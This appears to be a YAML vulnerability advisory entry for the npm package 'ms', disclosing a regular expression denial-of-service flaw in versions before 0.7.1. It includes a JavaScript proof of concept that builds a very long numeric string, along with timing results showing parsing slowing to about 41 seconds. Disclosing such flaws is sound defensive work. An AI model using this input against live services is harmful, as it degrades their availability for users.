- id: npmjs:npm:ms:46
  title: Regular Expression Denial of Service
  description: "Versions of `ms` prior to 0.7.1 are affected by a regular expression
    denial of service vulnerability when extremely long version strings are parsed.\n\n##
    Proof of Concept\n```javascript\nvar ms = require('ms');\nvar genstr = function
    (len, chr) {\n   var result = \"\";\n   for (i=0; i<=len; i++) {\n       result
    = result + chr;\n   }\n\n   return result;\n}\n\nms(genstr(process.argv[2], \"5\")
    + \" minutea\");\n\n```\n\n### Results\nShowing increase in execution time based
    on the input string.\n```\n$ time node ms.js 10000\n\nreal\t0m0.758s\nuser\t0m0.724s\nsys\t0m0.031s\n\n$
    time node ms.js 20000\n\nreal\t0m2.580s\nuser\t0m2.494s\nsys\t0m0.047s\n\n$ time
    node ms.js 30000\n\nreal\t0m5.747s\nuser\t0m5.483s\nsys\t0m0.080s\n\n$ time node
    ms.js 80000\n\nreal\t0m41.022s\nuser\t0m38.894s\nsys\t0m0.529s\n```\n"
  affected_package: ms
  vulnerable_versions:
